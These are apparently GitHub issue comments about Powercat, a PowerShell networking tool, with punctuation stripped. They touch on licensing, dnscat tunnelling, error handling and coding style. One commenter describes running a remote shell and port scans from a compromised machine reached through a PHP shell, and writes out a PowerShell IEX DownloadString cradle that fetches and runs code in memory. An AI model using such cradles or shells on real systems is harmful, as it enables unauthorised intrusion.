Hi Can you document explicitly under which license you are distributed your code without explicit mention all rights are reserved You could add a LICENSE file or add a explicit mention in the READMEmd Thanks Hi Im using Powercat to achieve a remote shell and after this execute a port scan over other machines that the infected machine have visibilization Im executing the port scaning of Powercat from memory using the folowing command powershell IEX NewObject SystemNetWebclientDownloadString powercat c p t Verbose When I execute it the remote shell disconnected and the result appear on the navigator which is used to infect the machine via PHP shell Why does it happen How can I fix it Thanks Maybe Im missing something but there appears to be no way to detect connection errors no exceptionerror is thrownwritten and evaluates to True in the following situations specified host doesnt exist timeout on connection connection rejected I am tying to connect to a dnscat server I use the security open setting I assume that is correct because I see no way to add a psk with powercatyet But im not getting a session Any help on how to set this up would be great got a little farther I set a dns domain on powercat and dnscat and it seems to connect I can enter a session now from dnscat back through but I have not commands or shell access The Powershell help system can now be used to inspect the function arguments and examples Also you can now use the Verbose switch to invoke the function with additional verbose output thats what CmdletBinding is for Some recommendations in style and functionality PS functions follow the convention of vernoun this could be InvokePowerCat in the main function It is PS not Bash so help should be in comment based form so it is discoverable and parable by GetHelp and not use a hhelp parameter Run in a PowerShell console help aboutCommentBasedHelp The main function should be an advanced function with cmdletbinding so as to manage parameters properly help aboutFunctionsCmdletBindingAttribute and help aboutFunctionsAdvancedParameters This is better suited as a module with a proper manifest where the main function is exported while the helper ones are hidden from the user so it can be used as a proper tool and allow for module autoloading getcommand discovery etc Look at help NewModuleManifest full Parameter should be full named parameters and not single letters or be aliased as single letters PowerShell behaves like Cisco IOS where for example UDP can be U or UD as long as it is unique enough vs the other parameters The community and MS are working on a Style Guide and Best Practices guide I know I made the recommendations to the original author but since I see it is being maintained by others now I thought I would repeat them Payload generation only works for the client mode currently and there is no certificate verification yet SSL listener mode does work with the full powercat cmdlet and does generate self signed certificates on the fly
